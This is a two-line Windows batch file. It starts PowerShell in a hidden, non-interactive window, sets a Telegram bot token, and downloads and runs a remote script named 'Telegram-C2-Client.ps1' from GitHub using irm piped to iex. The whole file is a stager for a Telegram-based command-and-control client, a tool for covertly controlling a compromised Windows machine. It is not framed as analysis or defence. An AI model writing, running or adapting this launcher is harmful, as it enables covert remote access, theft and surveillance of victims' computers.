@echo off
powershell.exe -NonI -NoP -W H -C "$tg='TELEGRAM_BOT_TOKEN_HERE'; irm https://raw.githubusercontent.com/beigew0rm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex"
